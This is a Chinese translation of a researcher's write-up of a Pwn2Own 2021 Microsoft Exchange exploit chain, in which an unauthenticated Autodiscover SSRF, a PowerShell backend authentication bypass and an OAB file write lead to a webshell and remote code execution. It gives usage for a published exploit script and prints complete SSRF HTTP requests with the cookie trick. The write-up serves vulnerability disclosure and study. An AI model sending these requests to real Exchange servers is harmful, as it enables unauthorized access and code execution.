本文为翻译稿件，原文：[Pwn2Own 2021 Microsoft Exchange Exploit
Chain](https://blog.viettelcybersecurity.com/pwn2own-2021-microsoft-exchange-exploit-chain/ "Pwn2Own 2021 Microsoft Exchange Exploit Chain")
## 漏洞利用简介
`Autodiscover`前端服务中的`Microsoft
Exchange`未经身份验证的`SSRF`，结合`Powershell`后端服务中的身份验证绕过和`OAB`后端服务中的任意文件写入，导致远程代码执行。
## 漏洞摘要
漏洞利用链允许远程攻击者编写`webshell`并在受影响的`Microsoft Exchange
Server`安装上执行任意代码，无需身份验证即可利用此漏洞。这三个漏洞包括：
  * 前端服务中未经身份验证的`SSRF`允许远程攻击者以`LocalSystem`权限向后端服务发送任意命令;
  * 允许远程攻击者绕过`Powershell`后端服务中的身份验证绕过以管理员权限运行任意`Exchange cmdlet`;
  * `OAB`后端服务中的任意文件写入允许远程攻击者可以在`OAB`文件夹上编写`webshell`。
前两个漏洞被称为`ProxyShell`漏洞,与`Orange Tsai`重复。 所以我在`Pwn2Own`比赛中只获得了部分胜利。
第三个漏洞有趣且复杂，我学到了很多关于`Microsoft Exchange`数据库 (MDB) 和 OAB 协议的内部知识。
此外，还可以利用它在`Exchange Online`服务上获取`RCE'`。 我在我的团队中进行了本地演示。
阅读此博客后，您可以在此处(
## 漏洞分析
该漏洞由`Python 2.7`开发。 安装请求模块：`pip install requests`.  
执行命令：
    python exploit.py   
        - url: the target url, for example https://ex19.exchangelab.local
        - domain_part: the domain part an email address, for example PI:EMAIL, the domain part will be exchangelab.local
        - command: the cmd command to run on server, for example whoami, dir
    Example:
    python exploit.py https://ex19.exchangelab.local exchangelab.local "whoami /all"
我在这里发布了我的漏洞[
exploit.py](https://gist.github.com/rskvp93/4e353e709c340cb18185f82dbec30e58 "
exploit.py")
## 漏洞一
`Exchange`邮箱服务器上的客户端访问服务负责接受所有形式的客户端连接。客户端访问（前端）服务将这些连接代理到目标邮箱服务器（本地服务器或保存用户邮箱的活动副本的远程邮箱服务器）上的后端服务,客户端不直接连接到后端服务。通信如下图所示。
`Autodiscover`前端服务中的`SSRF`漏洞允许未经身份验证的远程攻击者，向任意后端服务发送带有受控uri和受控数据的任意请求。此代理请求作为`LocalSystem`帐户完全验证到后端服务。
示例请求如下：
    POST /Autodiscover/autodiscover.json?SecurityToken1=PI:EMAIL/ews/exchange.asmx HTTP/1.1
    Host: exchange16.domaincorp.com
    Connection: keep-alive
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
    SOAPAction: "http://schemas.microsoft.com/exchange/services/2006/messages/FindFolder"
    Content-Type: text/xml;charset=UTF-8
    Cookie: email=Autodiscover/autodiscover.json?SecurityToken1=PI:EMAIL
    Content-Length: 1429
       ...
电子邮件`cookie`的值为`“Autodiscover/autodiscover.json?SecurityToken1=PI:EMAIL”`。
如果`RequestPathParser.IsAutodiscoverV2PreviewRequest(base.ClientRequest.Url.AbsolutePath)`返回
`True`，它被设置到`this.explicitLogonAddress`。
然后当前端服务调用`GetClientUrlForProxy`方法构造代理路径转发给后端服务时，`this.explicitLogonAddress`的值将从原来的`AbsoluteUri`中移除。
注意，这里使用`base.ClientRequest.Url.AbsoluteUri`而不是
`base.ClientRequest.Url.AbsolutePath`。
原来的`AbsoluteUri`是
`/Autodiscover/autodiscover.json?SecurityToken1=PI:EMAIL/ews/exchange.asmx`。
移除`“Autodiscover/autodiscover.json?SecurityToken1=PI:EMAIL”`后，最后代理路径为`/ews/exchange.asmx`。
代理请求使用`LocalSystem`帐户（又名计算机帐户）进行身份验证，因为在`PrepareServerRequest`方法中，构造了`Kerberos`授权标头并将其添加到代理请求中。
对于这个漏洞，我使用了与最近`Orange Tsai`的`ProxyLogon`漏洞相同的操作（特别感谢他非常棒的bug和很多技术）。
以下有效负载将允许获取用户邮箱的`UserDN`（旧版
DN）（我使用`SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@domaincorp.com`，这是一个大众熟知的特殊邮箱）。
    POST /Autodiscover/autodiscover.json?SecurityToken1=PI:EMAIL/Autodiscover/Autodiscover.svc HTTP/1.1
    Host: exchange16.domaincorp.com
    Connection: keep-alive
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
    Content-Type: text/xml; charset=utf-8
    Cookie: email=Autodiscover/autodiscover.json?SecurityToken1=PI:EMAIL
    Content-Length: 1105
        Exchange2010
        http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetUserSettings
        https://mail.microsoft.com/autodiscover/autodiscover.svc
                SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@domaincorp.com
              UserDN
    HTTP/1.1 200 OK
    Cache-Control: private
    Content-Type: text/xml; charset=utf-8
    Vary: Accept-Encoding
    Server: Microsoft-IIS/10.0
    request-id: a1d3f976-97ad-42dd-b19a-07ed66b685a1
    X-CalculatedBETarget: exchange16.domaincorp.com
    X-DiagInfo: EXCHANGE16
    X-BEServer: EXCHANGE16
    X-AspNet-Version: 4.0.30319